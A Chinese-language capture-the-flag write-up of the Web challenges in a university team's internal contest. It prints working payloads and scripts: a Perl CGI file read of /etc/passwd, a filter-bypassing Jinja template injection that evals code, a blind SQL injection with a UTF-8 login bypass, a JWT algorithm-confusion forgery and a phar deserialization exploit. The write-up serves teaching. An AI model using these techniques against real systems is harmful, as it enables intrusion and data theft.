本次CTF是华东师范大学Metasequoia战队内部赛(虽然外校师傅也不少)，难度较为简单(仅限我会的)。  
也感谢Mercurio师傅的运维和其他各位师傅出的题。

题目和官方writeup都可以在这里查看

[github](https://github.com/SignorMercurio/MetasequoiaCTF)

## 题目

- Web
  - Simple Perl (by ice-cream)
  - EasyCalc (by ice-cream)
  - UTF-8 (by Mercurio)
  - jwt (by Mercurio)
  - BabyUnserialize (by ice-cream)
- Pwn
  - Blacksmith (by Mercurio)
  - Snow Mountain (by Mercurio)
  - Summoner (by Mercurio)
  - Demon Dragon (by Mercurio)
  - Samsara (by Mercurio)
- Misc
  - Check In (by FLAG挖掘机)
  - Don't Use Mac (by FLAG挖掘机)
  - Rabbit Hole (by Yoshino-s)
  - rm -rf / (by FLAG挖掘机)
- Crypto
  - Ridicule (by Mercurio)
  - Ridicule Revenge (by scholze)
  - Ridicule Rerevengevenge (by scholze)
- Reverse
  - CMCS (by Mercurio)
  - Babysmali (by Mercurio)
  - Prison (by Mercurio)

## Web

### Simple Perl

Perl CGI 没有研究过，但是直接Baidu一下发现了相关资料。

```perl
if ($cgi->upload('file')) {
  my $file = $cgi->param('file');
  while (<$file>) {
    print "$_";
    print "";  
    }
}
```

`param('file')` 会读取第一个参数，所以在正常表单前多加一个 `name` 为 `file` 的就可以了。  
`<$file>`是perl输入句柄，直接传字符串是没用的，但是传`ARGV`在CGI中可以获取GET参数，直接传入 `?/etc/passwd` 就可以读取 `/etc/passwd` 了。

直接上Payload

![Perl_open.png](http://24ec021532e6b02e3e203385287a1607.replace/f179c33ed865fa6c604f62c50a7ad0f4)

getshell, cat /flag.

---

### EasyCalc

显然是个计算器，开始尝试了好久，发现是Flask + python ast 实现，但是 ast 基本全都被禁用了，卡了好久。。。。。  
后来放出Hint发现是除0报错然后模板注入。。。。。

先构造简单的 payload

```python
1 / 0 # {{ 8*8 }}
```

发现回显是

```text
Formatted calculation:
1 / 0
Error:
Traceback (most recent call last): File "somewhere", line something, in something result = 1 / 0 # 64 ZeroDivisionError: division by zero
```

OK，存在模板注入，开始尝试。  
一番测试发现基本过滤了大部分特殊字符`[]"'__`等，网上找了一找，找到了[这篇文章](https://www.secpulse.com/archives/115367.html)

构造payload

```text
code=1 / 0 # {{ ()|attr(request.values.class)|attr(request.values.base)|attr(request.values.subclasses)()|attr(request.values.getitem)(64)|attr(request.values.init)|attr(request.values.globals)|attr(request.values.getitem)(request.values.builtins)|attr(request.values.getitem)(request.values.eval)(request.values.cmd)}}&class=__class__&base=__base__&subclasses=__subclasses__&getitem=__getitem__&init=__init__&globals=__globals__&builtins=__builtins__&eval=eval&cmd=open('/flag').read()
```

返回值

```text
Formatted calculation:
1 / 0
Error:
Traceback (most recent call last): File "somewhere", line something, in something result = 1 / 0 # flag{5c2d13a15fb04fb0919c9881278398d2} ZeroDivisionError: division by zero
Formatted calculation:
```

ok, 过了

---

### UTF-8

这个题是个sqli，不是很擅长，找了波[资料](https://p0sec.net/index.php/archives/94/)。

从 `/robots.txt` 看到一个奇怪的脚本

```perl
length q chdir lc and print chr ord q each le and print chr ord q lc eval and print chr ord q lt eval and print chr ord q sin s and print chr ord q xor x and print chr ord qw q not q and print chr oct oct ord q eq ge and print chr ord q msgctl m and print chr ord q local and print chr ord q dump and and print chr ord q or no and print chr ord q oct no and print chr ord q ge log
```

扔到百度发现是perl，跑一下得到 `action=source` ，然后看到源码。

![utf-8-source.png](https://i.loli.net/2020/02/22/2RDA5ezUsVH8Ncb.png)

有个 utf-8 转 latin 找资料发现可以用 `admin%c2` bypass 用户名，密码直接盲注出来，是个原题，直接用原脚本就可以跑出来

然后就过了,payload 如下

```python
import requests
url = 'http://ctf.metasequoia.tk:29971/?action='
def check(payload):
    postdata = {'username':payload}
    r = requests.post(url+'show', postdata).content
    return b'admin' in r

password  = ''
s = '0123456789abcdef'

for i in range(32,0,-1):
    for c in s:
        payload = '\'=(select(1)from(user)where(mid((passwd)from(%d))=\'%s\'))=\'' % (i, (c+password))
        if check(payload):
            password = c + password
            break
    print(password)

print(requests.post(url+'login', data={
  'username': b'admin\xc2',
  'passwd': password
}).text)
```

直接返回flag，过了

---

### jwt

jwt是一种比session稍微高级一点的状态认证手段，最近在玩玩nodejs后端有研究，稍微看了眼题目，是个Python后端，用PyJWT写的jwt，RSA加密，可以获得公钥，没法搞到私钥。  
[JWT介绍](https://jwt.io)
网上找了波资料发现jwt有几个漏洞

1. 直接将`alg`设为`none` ,签名段留空
2. 把`alg`设为`HS256` 。本来为 `RS256` ，用私钥签名，用公钥验证，改为 `HS256` 后，由于服务器端还是用原RSA公钥验证，所以只要用原公钥签名的jwt传过去，也能验证成功。

测试了一下，第一种过不去，第二种成功了

直接上payload

```python
#!/usr/bin/env python
import requests
import jwt
from hashlib import md5

url = "http://ctf.metasequoia.tk:29753"

s = requests.session()

def reg(name, passwd ):
    return s.post(url + '/reg', data={
        "regname": name,
        "regpass": passwd
    }).json()

def login(name, passwd ):
    return s.post(url + '/login', data={
        "name": name,
        "pass": passwd
    }).json()

def listLinks(token):
    return s.get(url + '/list', headers={
        "Authorization": "Bearer "+token
    }).json()['links']

def getFake(name, pub):
    return jwt.encode({"name": name, "priv": "admin"}, key=pub, algorithm='HS256').decode()


def getPub(name, passwd):
    return s.get(url + '/pubkey/'+ md5((name+passwd).encode()).hexdigest()).json()['pubkey']

reg('12345', '12345')

token = login('12345', '12345')['token']

pubkey = getPub('12345', '12345')

faketoken = getFake('12345', pubkey)

l = listLinks(faketoken)[0]

link = requests.get(url + '/text/' + l).json()['content']

print(requests.get(url+link).text)
```

过了

---

### BabyUnserialize

`.checkmime.php.swp` 泄露， 获得源代码，是个phar反序列化，查资料可以知道phar包没法直接改，末尾还有签名，需要重新签名才可以成功解析

构建一个图片文件开头的phar包，把 `Main` 放到 `metadata` 里面  
注意要在 `php.ini` 里面把 `phar.readOnly` 关掉 

```php
<?php
class tooYoung{
  protected $naive="reporter";
}
class Main {
  public $file="/flag";
}

$phar = new Phar('text.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setSignatureAlgorithm(Phar::MD5);

$img = file_get_contents('./2.png');

$phar->setStub($img.'<?php __HALT_COMPILER(); ? >');

$object = new Main;
$phar->setMetadata($object);
$phar->stopBuffering();
?>
```

然后修改序列化字符串以跳过 `__wakeup` ，之后重新签名，签名格式见[php官网](https://www.php.net/manual/en/phar.fileformat.signature.php)，然后上传，再用 `checkmime.php` 解析，反序列化成功。

```python
import requests

print(requests.post('http://ctf.metasequoia.tk:25323/checkmime.php?reporter=O:8:"tooYoung":1:{s:8:"\x00*\x00naive";s:8:"reporter";}', data={
    'name': "phar://./uploads/09b8cd39aa.png",
    'submit': ''
}).text)
```
